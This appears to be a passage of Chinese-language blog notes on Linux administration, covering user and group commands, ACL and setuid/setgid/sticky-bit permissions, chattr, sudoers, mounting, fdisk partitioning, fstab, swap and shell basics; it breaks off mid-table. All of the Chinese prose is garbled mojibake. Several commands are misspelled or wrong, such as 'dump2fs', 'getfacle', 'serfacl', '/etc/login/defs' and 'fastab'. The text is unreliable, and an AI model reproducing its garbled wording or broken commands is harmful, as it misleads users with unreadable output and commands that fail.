<h3 id="ç”¨æˆ·ç®¡ç†å‘½ä»¤"><a href="#ç”¨æˆ·ç®¡ç†å‘½ä»¤" class="headerlink" title="ç”¨æˆ·ç®¡ç†å‘½ä»¤"></a>ç”¨æˆ·ç®¡ç†å‘½ä»¤</h3><h4 id="æ·»åŠ ç”¨æˆ·"><a href="#æ·»åŠ ç”¨æˆ·" class="headerlink" title="æ·»åŠ ç”¨æˆ·"></a>æ·»åŠ ç”¨æˆ·</h4><ul>
<li><p><code>useradd [option] ç”¨æˆ·å</code></p>
<p>â€‹    -u æ‰‹å·¥æŒ‡å®šuid</p>
<p>â€‹    -d å®¶ç›®å½•</p>
<p>â€‹    -c ç”¨æˆ·çš„è¯´æ˜</p>
<p>â€‹    -g æŒ‡å®šåˆå§‹ç»„</p>
<p>â€‹    -G æŒ‡å®šé™„å±ç»„</p>
<p>â€‹    -s æ‰‹å·¥æŒ‡å®šç”¨æˆ·shell</p>
</li>
</ul>
<h4 id="ä¿®æ”¹å¯†ç "><a href="#ä¿®æ”¹å¯†ç " class="headerlink" title="ä¿®æ”¹å¯†ç "></a>ä¿®æ”¹å¯†ç </h4><ul>
<li><p><code>passwd [option] ç”¨æˆ·å </code></p>
<p>-l é”å®šç”¨æˆ·,ç¦æ­¢å…¶ç™»å½•</p>
<p>-u è§£é”ç”¨æˆ·</p>
<p>â€“stdin å…è®¸ä½¿ç”¨æ ‡å‡†è¾“å…¥ä¿®æ”¹ç”¨æˆ·å¯†ç  </p>
<p>-d å…è®¸ä½¿ç”¨ç©ºå¯†ç ç™»å½•</p>
<p>-e å¼ºåˆ¶ç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶ä¿®æ”¹å¯†ç </p>
<p>-S æ˜¾ç¤ºç”¨æˆ·çš„å¯†ç æ˜¯å¦è¢«é”å®š,ä»¥åŠå¯†ç é‡‡ç”¨çš„åŠ å¯†ç®—æ³•åç§°</p>
</li>
<li><p>who  å¯ä»¥æŸ¥çœ‹å½“å‰ç™»å½•çš„ç”¨æˆ·ï¼Œwè¯¦ç»†ä¿¡æ¯ </p>
<p>ttyæ˜¯æœ¬åœ°ç»ˆç«¯ï¼Œptsè¡¨ç¤ºè¿œç¨‹ç»ˆç«¯</p>
</li>
<li><p>userdel ç”¨æˆ·å</p>
<p>- </p>
</li>
</ul>
<p>ç”¨æˆ·é»˜è®¤å€¼æ–‡ä»¶ /etc/default/useradd</p>
<p>é»˜è®¤å¯†ç æœ‰æ•ˆæœŸ /etc/login/defs</p>
<p><strong>ä¿®æ”¹ç”¨æˆ·</strong></p>
<p><code>usermod  [option] ç”¨æˆ·å</code></p>
<p>-c é™„åŠ è¯´æ˜</p>
<p>-G é™„åŠ ç»„</p>
<p>-L é”å®šç”¨æˆ·</p>
<p>-U è§£é”ç”¨æˆ·</p>
<p><code>chage ç”¨æˆ·å</code> ä¿®æ”¹ç”¨æˆ·å¯†ç çŠ¶æ€</p>
<p>chage -d 0 ç”¨æˆ·å # å½“å‰ç”¨æˆ·åçš„shadowç¬¬ä¸‰å­—æ®µä¿®æ”¹å¯†ç æ—¶é—´ä¸º0å¤©,ç™»å½•è¦æ±‚ç”¨æˆ·è®¾ç½®æ–°å¯†ç </p>
<h4 id="åˆ é™¤ç”¨æˆ·"><a href="#åˆ é™¤ç”¨æˆ·" class="headerlink" title="åˆ é™¤ç”¨æˆ·"></a>åˆ é™¤ç”¨æˆ·</h4><p><code>userdel [option] ç”¨æˆ·å</code></p>
<ul>
<li>-r åˆ é™¤ç”¨æˆ·çš„åŒæ—¶åˆ é™¤ç”¨æˆ·å®¶ç›®å½•</li>
<li>-f å¼ºåˆ¶åˆ é™¤</li>
</ul>
<p><code>su ç”¨æˆ·å</code></p>
<p><code>- è¿å¸¦ç¯å¢ƒå˜é‡ä¸€èµ·åˆ‡æ¢</code></p>
<p>-c ä¸åˆ‡æ¢èº«ä»½ç”¨rootèº«ä»½æ‰§è¡Œä¸€æ¡å‘½ä»¤</p>
<h3 id="ç”¨æˆ·ç»„ç®¡ç†"><a href="#ç”¨æˆ·ç»„ç®¡ç†" class="headerlink" title="ç”¨æˆ·ç»„ç®¡ç†"></a>ç”¨æˆ·ç»„ç®¡ç†</h3><h4 id="æ·»åŠ ç»„"><a href="#æ·»åŠ ç»„" class="headerlink" title="æ·»åŠ ç»„"></a>æ·»åŠ ç»„</h4><p><code>groupadd ç»„å</code></p>
<p>-g   æŒ‡å®šgid</p>
<h4 id="ä¿®æ”¹ç»„"><a href="#ä¿®æ”¹ç»„" class="headerlink" title="ä¿®æ”¹ç»„"></a>ä¿®æ”¹ç»„</h4><p><code>groupmod ç”¨æˆ·å</code></p>
<p>-n æ–°ç»„å</p>
<p>-g ä¿®æ”¹ç»„id</p>
<h4 id="åˆ é™¤ç»„"><a href="#åˆ é™¤ç»„" class="headerlink" title="åˆ é™¤ç»„"></a>åˆ é™¤ç»„</h4><p>groupdel</p>
<p>å°†ç”¨æˆ·æ·»åŠ ç»„æˆ–è€…ä»ç»„ä¸­åˆ é™¤</p>
<p>â€‹    gpasswd é€‰é¡¹ ç»„å</p>
<p>-a ç”¨æˆ·å æŠŠç”¨æˆ·åŠ å…¥ç»„</p>
<p>-d æŠŠç”¨æˆ·ä»ç»„ä¸­åˆ é™¤</p>
<p>åŠ çš„éƒ½æ˜¯é™„åŠ ç»„</p>
<h2 id="æƒé™ç®¡ç†"><a href="#æƒé™ç®¡ç†" class="headerlink" title="æƒé™ç®¡ç†"></a>æƒé™ç®¡ç†</h2><h4 id="aclæƒé™"><a href="#aclæƒé™" class="headerlink" title="aclæƒé™"></a>aclæƒé™</h4><p>è¡¥è¶³linuxä¸­æ‰€å±è€…æ‰€å±ç»„å…¶ä»–äººæƒé™é…ä¸è¶³çš„é—®é¢˜ï¼Œé€šè¿‡å¯¹å•ä¸ªç”¨æˆ·åˆ†é…ä¸åŒçš„æƒé™è¾¾åˆ°æƒé™åˆ†é…çš„ç›®åœ°</p>
<p>æŸ¥çœ‹æ˜¯å¦å¼€å¯aclæƒé™ï¼š <code>dump2fs -h /dev/sda3</code> è¯¥å‘½ä»¤ç”¨äºæŸ¥çœ‹å€¼éƒ½èƒ½å¤Ÿæ–‡ä»¶ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯</p>
<p>å¼€å¯aclæƒé™ï¼Œé»˜è®¤å·²ç»æŒ‚è½½</p>
<p>å¦‚æœæ²¡æœ‰aclæƒé™å°±é‡æ–°æŒ‚è½½åˆ†åŒº</p>
<ul>
<li><p>ä¸´æ—¶</p>
<p>mount -o remountï¼Œacl /</p>
</li>
<li><p>æ°¸ä¹…</p>
<ul>
<li><p>ä¿®æ”¹fastabæ–‡ä»¶</p>
<p>åœ¨defalutsååŠ å…¥<code>,acl</code></p>
<p>ä¹‹åé‡æ–°æŒ‚è½½<code>mount -o remount /</code>æˆ–è€…é‡å¯</p>
</li>
</ul>
</li>
</ul>
<p>æŸ¥çœ‹aclå‘½ä»¤</p>
<p><code>getfacle æ–‡ä»¶å</code></p>
<p>è®¾å®šaclæƒé™å‘½ä»¤</p>
<p><code>setfacl [option] æ–‡ä»¶å</code></p>
<p>-m èµ‹äºˆæƒé™ä½¿ç”¨  â€œu:ç”¨æˆ·å:æƒé™â€ çš„æ ¼å¼ï¼Œæƒé™å†™æ³•rwxï¼›â€œm:â€ ä¹‹åå†™å…¥çš„æƒé™æ˜¯æœ€å¤§æƒé™maskè®¾å®š</p>
<ul>
<li>æœ€å¤§maskæœ‰æ•ˆæƒé™ä¸åˆ é™¤</li>
</ul>
<p>maskæƒé™ä¸aclæƒé™ç›¸ä¸ä¹‹åæ‰æ˜¯æœ€ç»ˆæƒé™</p>
<ul>
<li>åˆ é™¤aclæƒé™</li>
</ul>
<p>setfacl -x uï¼šç”¨æˆ·å æ–‡ä»¶å</p>
<p>setfacl -x gï¼šç»„å æ–‡ä»¶å</p>
<p>setfacl -b æ–‡ä»¶å/ç›®å½•å</p>
<ul>
<li>é€’å½’aclæƒé™</li>
</ul>
<p>serfacl -m uï¼šç”¨æˆ·å ï¼šæƒé™ -R æ–‡ä»¶å</p>
<ul>
<li>é»˜è®¤aclæƒé™</li>
</ul>
<p>serfacl -m dï¼šuï¼šç”¨æˆ·å ï¼šæƒé™  æ–‡ä»¶å</p>
<h4 id="æ–‡ä»¶ç‰¹æ®Šæƒé™"><a href="#æ–‡ä»¶ç‰¹æ®Šæƒé™" class="headerlink" title="æ–‡ä»¶ç‰¹æ®Šæƒé™"></a>æ–‡ä»¶ç‰¹æ®Šæƒé™</h4><p>å¦‚æœè®¾ç½®äº†setuidé‚£ä¹ˆæ‰€æœ‰è€…çš„æƒé™å°±ä¼šå˜æˆ<code>rws</code>åŸæœ¬xå˜æˆs</p>
<p>å…¶ä½™ä¸¤ä¸ªåŒç†</p>
<ul>
<li><p>setuid</p>
<ul>
<li>åªæœ‰å¯ä»¥æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶æ‰èƒ½è®¾å®šsetuidæƒé™</li>
<li>æ‰§è¡Œè€…å¿…é¡»è¦æœ‰xæƒé™</li>
<li>ï¼ˆåœ¨è®¾ç½®äº†setuidä¹‹åï¼‰å‘½ä»¤æ‰§è¡Œè€…åœ¨æ‰§è¡Œæ–‡ä»¶ä¼šæš‚æ—¶è·å¾—æ–‡ä»¶æ‰€æœ‰è€…çš„èº«ä»½</li>
<li>seruidæƒé™åªæœ‰åœ¨æ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ  </li>
</ul>
<p><strong>è®¾å®šæ–¹æ³•</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 4755 æ–‡ä»¶å #4è¡¨ç¤ºsuid</span><br><span class="line">chmod u+s æ–‡ä»¶å</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">åˆ é™¤suidæ–¹æ³•</span></span><br><span class="line">chmod 755 æ–‡ä»¶å</span><br><span class="line">chmod u-s æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<p>è¯¥æƒé™éå¸¸å±é™©ï¼Œåº”ä¸¥æ ¼æ§åˆ¶å†™æƒé™</p>
</li>
<li><p>setgid</p>
<ul>
<li><p>åªæœ‰å¯ä»¥æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶æ‰èƒ½è®¾å®šsetuidæƒé™</p>
</li>
<li><p>æ‰§è¡Œè€…å¿…é¡»è¦æœ‰xæƒé™</p>
</li>
<li><p>ï¼ˆåœ¨è®¾ç½®äº†setuidä¹‹åï¼‰å‘½ä»¤æ‰§è¡Œè€…åœ¨æ‰§è¡Œæ–‡ä»¶ä¼šæš‚æ—¶è·å¾—æ–‡ä»¶æ‰€å±ç»„çš„èº«ä»½</p>
</li>
<li><p>setgidæƒé™åªæœ‰åœ¨æ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ  </p>
<p>é’ˆå¯¹ç›®å½•åŠŸèƒ½</p>
<ul>
<li> æ™®é€šç”¨æˆ·å¿…é¡»å¯¹æ­¤ç›®å½•æ‹¥æœ‰rå’Œxæƒé™æ‰èƒ½è¿›å…¥æ­¤ç›®å½•</li>
<li>æ™®é€šç”¨æˆ·åœ¨æ­¤æœ‰æ•ˆç»„ä¼šå˜æˆæ­¤ç›®å½•çš„å±ç»„</li>
<li>å¦‚æœæ™®é€šç”¨æˆ·å¯¹æ­¤ç»„æœ‰wæƒé™ï¼Œé‚£ä¹ˆæ–°å»ºçš„æ–‡ä»¶é»˜è®¤å±ç»„æ˜¯è¿™ä¸ªç›®å½•çš„å±ç»„</li>
</ul>
<p>è®¾å®šæ–¹æ³•ä¸sgidç±»ä¼¼ï¼Œ2è¡¨ç¤ºsgidæˆ–è€…g+s</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  chmod 2755 æ–‡ä»¶å #2è¡¨ç¤ºsgid</span><br><span class="line">  chmod g+s æ–‡ä»¶å</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">åˆ é™¤sgidæ–¹æ³•</span></span><br><span class="line">chmod 755 æ–‡ä»¶å</span><br><span class="line">chmod g-s æ–‡ä»¶å</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<ul>
<li>sbitï¼ˆsticky bitï¼‰</li>
</ul>
<p>ç²˜ç€ä½</p>
<p>ä½œç”¨ï¼šuser1åˆ›å»ºçš„æ–‡ä»¶ï¼Œuser2æ²¡æ³•ä¿®æ”¹å’Œåˆ é™¤</p>
<p>å‰æï¼š</p>
<ul>
<li><p>åªå¯¹ç›®å½•æœ‰æ•ˆ</p>
</li>
<li><p>æ™®é€šè¯ç”¨æˆ·å¯¹è¯¥ç›®å½•æ‹¥æœ‰wxæƒé™</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 1755 ç›®å½•å #1è¡¨ç¤ºsbit</span><br><span class="line">chmod o+t ç›®å½•å</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">åˆ é™¤sbitæ–¹æ³•</span></span><br><span class="line">chmod 777 ç›®å½•å</span><br><span class="line">chmod o-t ç›®å½•å</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="æ–‡ä»¶ç³»ç»Ÿå±æ€§chattræƒé™"><a href="#æ–‡ä»¶ç³»ç»Ÿå±æ€§chattræƒé™" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿå±æ€§chattræƒé™"></a>æ–‡ä»¶ç³»ç»Ÿå±æ€§chattræƒé™</h4><p>change atrribute</p>
<p>æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿå±æ€§<code>lsattr -a æ–‡ä»¶æˆ–ç›®å½•</code></p>
<p>aï¼šæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶å’Œç›®å½•</p>
<p>dï¼šç›®æ ‡æ˜¯ç›®å½•ï¼Œä»…åˆ—å‡ºç›®å½•æœ¬èº«çš„å±æ€§è€Œä¸æ˜¯å­æ–‡ä»¶</p>
<p>é’ˆå¯¹rootç”¨æˆ·ä¹Ÿç”Ÿæ•ˆ</p>
<p><code>chattr [+-=] [é€‰é¡¹][æ–‡ä»¶æˆ–ç›®å½•]</code></p>
<p>iï¼šå¦‚æœå¯¹æ–‡ä»¶è®¾ç½®iï¼Œç›¸å½“äºåªè¯»ï¼›å¦‚æœæ˜¯ç›®å½•ï¼Œä»…èƒ½å¯¹å·²å­˜åœ¨æ–‡ä»¶å†…å®¹è¿›è¡Œä¿®æ”¹</p>
<p>aï¼šå¯¹äºæ–‡ä»¶ï¼Œåªèƒ½åœ¨æ–‡ä»¶ä¸­å†™å…¥æ–°çš„æ•°æ®ï¼ˆåªèƒ½ç”¨ehcoæ–¹å¼è¿½åŠ ï¼‰ï¼Œä¸èƒ½åˆ é™¤å’Œä¿®æ”¹ï¼›å¯¹äºç›®å½•å…è®¸æ–°å»ºå’Œä¿®æ”¹æ–‡ä»¶ä½†æ˜¯ä¸å…è®¸åˆ é™¤</p>
<h4 id="sudoæƒé™"><a href="#sudoæƒé™" class="headerlink" title="sudoæƒé™"></a>sudoæƒé™</h4><p>rootæŠŠæœ¬æ¥åªæœ‰è¶…çº§ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤èµ‹äºˆæ™®é€šç”¨æˆ·æ‰§è¡Œ</p>
<p>sudoçš„æ“ä½œå¯¹è±¡æ˜¯ç³»ç»Ÿå‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">visudo æˆ–è€… vim /etc/sudoers</span><br><span class="line">root all=(all) all</span><br><span class="line"><span class="meta">#</span><span class="bash"> ç”¨æˆ·å   è¢«ç®¡ç†ä¸»æœºåœ°å€ = ï¼ˆå¯ä½¿ç”¨çš„èº«ä»½ï¼‰ æˆæƒå‘½ä»¤ï¼ˆç»å¯¹è·¯å¾„ï¼‰</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="åˆ†åŒºå‘½ä»¤"><a href="#åˆ†åŒºå‘½ä»¤" class="headerlink" title="åˆ†åŒºå‘½ä»¤"></a>åˆ†åŒºå‘½ä»¤</h2><h4 id="æŸ¥çœ‹åˆ†åŒºä¿¡æ¯disk-free"><a href="#æŸ¥çœ‹åˆ†åŒºä¿¡æ¯disk-free" class="headerlink" title="æŸ¥çœ‹åˆ†åŒºä¿¡æ¯disk free"></a>æŸ¥çœ‹åˆ†åŒºä¿¡æ¯disk free</h4><p>â€‹    df [option] [file name]</p>
<p>â€‹        -aæ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯</p>
<p>â€‹        -h ä½¿ç”¨ä¹ æƒ¯å•ä½æ˜¾ç¤ºå®¹é‡</p>
<h4 id="æ˜¾ç¤ºç›®å½•å’Œæ–‡ä»¶çš„å¤§å°data-usage"><a href="#æ˜¾ç¤ºç›®å½•å’Œæ–‡ä»¶çš„å¤§å°data-usage" class="headerlink" title="æ˜¾ç¤ºç›®å½•å’Œæ–‡ä»¶çš„å¤§å°data usage"></a>æ˜¾ç¤ºç›®å½•å’Œæ–‡ä»¶çš„å¤§å°data usage</h4><p>â€‹    du [option] [file name]</p>
<p>â€‹        -a æ˜¾ç¤ºæ¯ä¸ªå­æ–‡ä»¶çš„ç£ç›˜å ç”¨é‡</p>
<p>â€‹        -h ä»¥ä¹ æƒ¯çš„å•ä½æ˜¾ç¤ºç£ç›˜å ç”¨</p>
<p>â€‹        -s ç»Ÿè®¡å ç”¨é‡,ä¸åˆ—å‡ºå­ç›®å½•å’Œå­æ–‡ä»¶å ç”¨é‡</p>
<h4 id="æŒ‚è½½"><a href="#æŒ‚è½½" class="headerlink" title="æŒ‚è½½"></a>æŒ‚è½½</h4><p>mount [-l] æ˜¾ç¤ºå·²ç»æŒ‚è½½çš„è®¾å¤‡,-l ä¼šæ˜¾ç¤ºå·æ ‡åç§°</p>
<p>mount -a æ ¹æ®/etc/fstab çš„å†…å®¹,è‡ªåŠ¨æŒ‚è½½</p>
<p><strong>mount</strong> [-t æ–‡ä»¶ç³»ç»Ÿ ]  [-L å·æ ‡å] [-o ç‰¹æ®Šé€‰é¡¹] <strong>è®¾å¤‡æ–‡ä»¶å</strong>     <strong>æŒ‚è½½ç‚¹</strong></p>
<p>å…‰ç›˜çš„æ–‡ä»¶ç³»ç»Ÿæ˜¯iso9660</p>
<p>ç‰¹æ®Šé€‰é¡¹:</p>
<p>remount é‡æ–°æŒ‚è½½</p>
<p>exec/noexec å…è®¸æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…ç¦æ­¢</p>
<h5 id="æŒ‚è½½å…‰ç›˜"><a href="#æŒ‚è½½å…‰ç›˜" class="headerlink" title="æŒ‚è½½å…‰ç›˜"></a>æŒ‚è½½å…‰ç›˜</h5><p>mount /dev/cdrom /mnt/cdrom/</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç³»ç»Ÿé»˜è®¤çš„å³ä¸ºå…‰ç›˜çš„è®¾å¤‡æ–‡ä»¶åä¹Ÿå¯ä»¥æ˜¯sr0</p>
<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‚è½½ç‚¹,å½“å‰å‘½ä»¤æŒ‚è½½åœ¨/mnt/cdrom/æ–‡ä»¶å¤¹ä¸‹</p>
<h5 id="æŒ‚è½½uç›˜"><a href="#æŒ‚è½½uç›˜" class="headerlink" title="æŒ‚è½½uç›˜"></a>æŒ‚è½½uç›˜</h5><ul>
<li>é¦–å…ˆéœ€è¦æŸ¥è¯¢upanè®¾å¤‡æ–‡ä»¶å</li>
</ul>
<p><code>fdisk -l</code> æ‰¾åˆ°uç›˜çš„è®¾å¤‡æ–‡ä»¶å</p>
<ul>
<li><strong>mount</strong> [-t æ–‡ä»¶ç³»ç»Ÿ ]  [-L å·æ ‡å] [-o ç‰¹æ®Šé€‰é¡¹] <strong>è®¾å¤‡æ–‡ä»¶å</strong>     <strong>æŒ‚è½½ç‚¹</strong></li>
</ul>
<p>è®¾å¤‡æ–‡ä»¶åæ˜¯åˆšåˆšupançš„è®¾å¤‡æ–‡ä»¶å,æŒ‚è½½ç‚¹éšæ„,linuxç³»ç»Ÿå»ºè®®mntä¸‹</p>
<h4 id="å¸è½½è®¾å¤‡"><a href="#å¸è½½è®¾å¤‡" class="headerlink" title="å¸è½½è®¾å¤‡"></a>å¸è½½è®¾å¤‡</h4><p>umount <strong>è®¾å¤‡æ–‡ä»¶å / æŒ‚è½½ç‚¹</strong></p>
<h3 id="fdiskè¿›è¡Œåˆ†åŒº"><a href="#fdiskè¿›è¡Œåˆ†åŒº" class="headerlink" title="fdiskè¿›è¡Œåˆ†åŒº"></a>fdiskè¿›è¡Œåˆ†åŒº</h3><p>å…ˆ<strong>æ‹“å±•åˆ†åŒº</strong>å†<strong>é€»è¾‘åˆ†åŒº</strong>æœ€å<strong>æŒ‚è½½åˆ†åŒº</strong></p>
<p> sdb1,2,3,4 ä¸ºåªèƒ½ç»™ä¸»åˆ†åŒºæˆ–è€…æ‹“å±•åˆ†åŒº,è€Œä¸èƒ½ç»™é€»è¾‘åˆ†åŒº</p>
<p>5å¼€å§‹ä¸ºæ‹“å±•åˆ†åŒº,æ‹“å±•åˆ†åŒºçš„ä½œç”¨æ˜¯åœ¨æ‹“å±•åˆ†åŒºå†…å»ºç«‹æ›´å¤šçš„åˆ†åŒº</p>
<ul>
<li>fdisk -l æŸ¥è¯¢æ–°ç¡¬ç›˜ä¿¡æ¯</li>
<li>fdisk /dev/sdb(a) ä½¿ç”¨(è¿›å…¥ä¸€ä¸ªlinuxè‡ªå¸¦çš„åˆ†åŒºç¨‹åº,æ ¹æ®æç¤ºå®Œæˆåˆ†åŒº)</li>
<li>partprobe é‡æ–°è¯»å–åˆ†åŒºè¡¨ä¿¡æ¯</li>
<li><code>mkfs - t ext4 [åˆšåˆšåˆ›å»ºçš„åˆ†åŒº]</code>     æ ¼å¼åŒ–å·²åˆ›å»ºçš„åˆ†åŒº,åªèƒ½æ ¼å¼åŒ–é€»è¾‘åˆ†åŒºå’Œä¸»åˆ†åŒº,ä¸èƒ½æ ¼å¼åŒ–æ‹“å±•åˆ†åŒº,æ ¼å¼åŒ–ä¹‹åæ‰å¯ä»¥æŒ‚è½½</li>
<li>ä½¿ç”¨mount æŒ‚è½½</li>
</ul>
<h3 id="è‡ªåŠ¨æŒ‚è½½å’Œfstabæ–‡ä»¶ä¿®å¤"><a href="#è‡ªåŠ¨æŒ‚è½½å’Œfstabæ–‡ä»¶ä¿®å¤" class="headerlink" title="è‡ªåŠ¨æŒ‚è½½å’Œfstabæ–‡ä»¶ä¿®å¤"></a>è‡ªåŠ¨æŒ‚è½½å’Œfstabæ–‡ä»¶ä¿®å¤</h3><ul>
<li>fstabæ–‡ä»¶ä¿®å¤ä»…å‡ºç°åœ¨centos7ä»¥ä¸‹çš„ç³»ç»Ÿ</li>
</ul>
<p>è‡ªåŠ¨æŒ‚è½½å®ç°å½¢å¼: ä¿®æ”¹/etc/fstabæ–‡ä»¶å†…å®¹</p>
<ul>
<li>ç¬¬ä¸€ä¸ªå­—æ®µ,åˆ†åŒºè®¾å¤‡æ–‡ä»¶åæˆ–è€…uuid</li>
<li>ç¬¬äºŒå­—æ®µ:æŒ‚è½½ç‚¹</li>
<li>ç¬¬ä¸‰å­—æ®µ:æ–‡ä»¶ç³»ç»Ÿå</li>
<li>ç¬¬å››å­—æ®µ:æŒ‚è½½å‚æ•°</li>
<li>ç¬¬äº”å­—æ®µ:ç³»ç»Ÿæ˜¯å¦å®šæœŸå¤‡ä»½,0è¡¨ç¤ºä¸å¤‡ä»½,1è¡¨ç¤ºæ¯å¤©å¤‡ä»½,2è¡¨ç¤ºä¸å®šæœŸå¤‡ä»½</li>
<li>ç¬¬å…­å­—æ®µæŒ‡å®šåˆ†åŒºæ˜¯å¦è¢«fsckæ£€æµ‹,0è¡¨ç¤ºä¸æ£€æµ‹,å…¶ä»–æ•°å­—ä»£è¡¨æ£€æµ‹çš„ä¼˜å…ˆçº§é«˜,1&gt;2</li>
</ul>
<p>ä¿®æ”¹å®Œæˆåè¿›è¡Œæ“ä½œmount -a,</p>
<p>è¯¥å‘½ä»¤æ ¹æ®fstabæ–‡ä»¶è‡ªåŠ¨æŒ‚è½½åˆ†åŒº,å¼€æœºè‡ªåŠ¨æŒ‚è½½</p>
<p>å¦‚æœæ˜¯centos 7ä»¥ä¸‹ çš„ç³»ç»Ÿ,å¦‚æœä¿®æ”¹é”™è¯¯fstabæ–‡ä»¶ä¼šå¯¼è‡´ç³»ç»Ÿå¼‚å¸¸æ— æ³•å¯åŠ¨,æ ¹æ®å‘½ä»¤è¾“å…¥rootå¯†ç è¿›å…¥æç¤ºç¬¦ç•Œé¢</p>
<p>é¦–å…ˆè¦ç»™æ–‡ä»¶mount â€“o remount,rw /é‡æ–°æŒ‚è½½è¯¥æ–‡ä»¶ä¸ºè¯»å†™,å°±å¯ä»¥è¿›å…¥/etc/fstabä¸­ä¿®æ”¹</p>
<h4 id="åˆ†é…swapåˆ†åŒº"><a href="#åˆ†é…swapåˆ†åŒº" class="headerlink" title="åˆ†é…swapåˆ†åŒº"></a>åˆ†é…swapåˆ†åŒº</h4><ul>
<li>æŸ¥è¯¢å†…å­˜å’Œswapåˆ†åŒºå ç”¨æƒ…å†µ  free</li>
<li>æ–°å»ºswapåˆ†åŒº fdisk /dev/sdb,å¹¶ä¸”å°†idæ”¹ä¸º82</li>
<li>swapåˆ†åŒºç‰¹æœ‰çš„æ ¼å¼åŒ–å‘½ä»¤ mkswap /dev/sdb6</li>
<li>åŠ å…¥swapåˆ†åŒº swapon /dev/sdb6,å–æ¶ˆç”¨æ˜¯swapoff</li>
<li>æœ€ååŠ å…¥/etc/fstabå¼€æœºè‡ªåŠ¨æŒ‚è½½</li>
</ul>
<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>ä½¿Linuxç³»ç»Ÿå¯ä»¥è¯†åˆ«å‡ºè¯¥æ–‡ä»¶æ˜¯ä¸ªshellè„šæœ¬æ–¹æ³•ï¼Œåœ¨æ–‡ä»¶çš„å¼€å¤´æ·»åŠ ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>çš„å£°æ˜ï¼Œ<strong>è¯¥#ä¸æ˜¯æ³¨é‡Šå†…å®¹è€Œæ˜¯å£°æ˜</strong></p>
<ul>
<li><p>echo</p>
<p>-e æ”¯æŒè½¬ä¹‰ç¬¦å·\</p>
<p>â€œ â€œ,å¼•èµ·çš„å†…å®¹è¾“å‡º</p>
<p>æ‰§è¡Œshellè„šæœ¬ï¼š</p>
<ol>
<li>èµ‹äºˆæ‰§è¡Œæƒé™ç›´æ¥è¿è¡Œï¼š<code>chmod 755 hello.sh</code> or  <code>./hello.sh</code>   </li>
<li>é€šè¿‡è°ƒç”¨bashæ‰§è¡Œè„šæœ¬ <code>bash hello.sh</code></li>
</ol>
</li>
</ul>
<p>é‡åˆ°æ— æ³•æ‰§è¡Œçš„shellè„šæœ¬ï¼Œå› ä¸ºè¯¥è„šæœ¬æ˜¯åœ¨windowsç¯å¢ƒä¸‹å†™æˆçš„ï¼Œå›è½¦ç¬¦æ˜¯<code>M$</code>è€ŒLinuxæ˜¯<code>$</code>,éœ€è¦ç”¨dos2unixå‘½ä»¤è½¬æ¢è„šæœ¬å›è½¦è¯†åˆ«ç¬¦ä½¿Linuxæ”¯æŒï¼Œè¯¥å‘½ä»¤å¯ä»¥ç”¨åœ¨çº¿åŒ…ç®¡ç†è·å–ï¼›</p>
<ul>
<li>history</li>
</ul>
<p>-c æ¸…ç©ºå†å²å‘½ä»¤</p>
<p>-w æŠŠç¼“å­˜çš„å†å²å‘½ä»¤å†™å…¥å†å²å‘½ä»¤ä¿å­˜æ–‡ä»¶</p>
<p>~./bash_history</p>
<p>é»˜è®¤ä¿å­˜1000æ¡ï¼Œå¯ä»¥ä»/etc/profileä¸­ä¿®æ”¹ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶</p>
<ul>
<li>è‡ªåŠ¨è¡¥å…¨ï¼Œå¦‚æœå”¯ä¸€ï¼Œä¸€ä¸‹tabï¼Œä¸¤ä¸ªä»¥ä¸Šï¼Œä¸¤ä¸‹tabæŠŠæœ‰çš„éƒ½åˆ—å‡ºæ¥</li>
<li>å‘½ä»¤åˆ«å</li>
</ul>
<p>alias åˆ«å=â€˜å‘½ä»¤â€™</p>
<p><strong>ç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼</strong></p>
<p>è®©åˆ«åæ°¸ä¹…ç”Ÿæ•ˆï¼Œä¿®æ”¹æ–‡ä»¶vi /root/.bashrc</p>
<p>åˆ é™¤åˆ«å unalias åˆ«å</p>
<ul>
<li>å¿«æ·é”®</li>
</ul>
<p>ctrl+c ç»ˆæ­¢å½“å‰å‘½ä»¤</p>
<p>ctrl+l ç›¸å½“äºclear</p>
<p>ctrl+u åˆ é™¤/å‰ªåˆ‡ ä¸€è¡Œå·²ç»è¾“å…¥çš„å‘½ä»¤</p>
<p>ctrl+y ç²˜è´´å‰ªåˆ‡çš„å‘½ä»¤</p>
<p>ctrl+r æœç´¢å‘½ä»¤</p>
<p>ctrl+d é€€å‡ºå½“å‰ç»ˆç«¯</p>
<ul>
<li><p>æ ‡å‡†è¾“å…¥è¾“å‡º</p>
<table>
<thead>
<tr>
<th>è®¾å¤‡</th>
